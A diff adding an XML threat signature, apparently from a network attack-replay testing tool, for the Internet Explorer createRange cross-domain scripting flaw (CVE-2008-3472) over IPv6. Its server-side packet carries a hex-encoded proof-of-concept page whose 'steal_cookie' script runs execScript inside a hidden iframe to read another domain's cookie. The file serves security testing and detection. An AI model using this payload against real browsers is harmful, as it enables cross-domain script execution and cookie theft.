@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Internet Explorer createRange Cross Domain Scripting (IPv6 Version)"/>
+    <EngDesc display="true" value="There exists a vulnerability in Microsoft Internet Explorer. The vulnerability is due to a validation error when handling function call to createRange method. Successful exploitation can allow a remote attacker to execute arbitrary script code in a user's browser session in context of the trusted site and to access the content of a web page in a different domain. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="ACCESS_CONTROL_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Internet_Explorer"/>
+      <item value="Microsoft_Microsoft_Windows"/>
+      <item value="Microsoft_Microsoft_Windows_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Internet_Explorer_6"/>
+      <item value="Microsoft_Internet_Explorer_7"/>
+      <item value="Microsoft_Windows_2000"/>
+      <item value="Microsoft_Windows_XP"/>
+      <item value="Microsoft_Windows_Vista"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20081014-22"/>
+    <CVEID display="true" value="CVE-2008-3472"/>
+    <bugtraqID display="true" value="31615"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="46e93a21a2a2ab0d3bb5894385783fa0"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Partial"/>
+    <IntegImpact display="false" value="Partial"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1229608580"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1229572903" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="N"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="91E0F2D3" AckNumber="6DCC0E92" HeaderLength="05" WindowSize="FAF0" Checksum="E37A" UrgentPointer="0000" Options="" Payload="474554202F7E616E69752F706F632E68746D6C20485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F782D73686F636B776176652D666C6173682C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A49662D4D6F6469666965642D53696E63653A205468752C203233204F637420323030382031343A31333A333620474D540D0A49662D4E6F6E652D4D617463683A2022353834613038392D3332342D34353965633435343263343030220D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E313B205356313B202E4E455420434C5220322E302E3530373237290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6DCC0E92" AckNumber="91E0F4BA" HeaderLength="05" WindowSize="1920" Checksum="D96F" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C203233204F637420323030382031373A33373A343720474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205468752C203233204F637420323030382031373A33373A343020474D540D0A455461673A2022353834613038392D3332342D34353965663166306636313030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203830340D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C68746D6C3E0A3C626F64793E0A3C7363726970743E200A2020202066756E6374696F6E20737465616C5F636F6F6B69652829207B0A202020202020202073657454696D656F75742866756E6374696F6E28297B0A2020202020202020646F63756D656E742E676574456C656D656E74427949642827756E666F63757361626C6527292E666F63757328293B0A2020202020202020646F63756D656E742E73656C656374696F6E0A202020202020202020202020202020202E63726561746552616E676528290A202020202020202020202020202020202E706172656E74456C656D656E7428290A202020202020202020202020202020202E646F63756D656E740A202020202020202020202020202020202E706172656E7457696E646F770A202020202020202020202020202020202E65786563536372697074280A202020202020202020202020202020202020202027616C6572742822446F6D61696E3A2022202B205C0A20202020202020202020202020202020202020202020202020646F63756D656E742E646F6D61696E202B205C0A20202020202020202020202020202020202020202020202020225C5C6E636F6F6B69653A5C5C6E22202B205C0A20202020202020202020202020202020202020202020202020646F63756D656E742E636F6F6B696529272C0A2020202020202020202020202020202020202020274A53637269707427293B0A202020207D2C313030293B0A202020207D3B0A3C2F7363726970743E200A3C6469762069643D22756E666F63757361626C652220746162696E6465783D2236223E0A50726F6F66206F6620436F6E63657074204578706C6F69743C62723E0A436F70797269676874204173737572656E742053656375726520546563686E6F6C6F676965732C20612054454C555320636F6D70616E793C62723E0A3C2F6469763E0A3C696672616D65207372633D22687474703A2F2F7777772E7961686F6F2E636F6D22206F6E6C6F61643D22737465616C5F636F6F6B6965282922206865696768743D30252077696474683D30253E3C2F696672616D653E20202020202020200A3C62723E0A3C2F626F64793E0A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
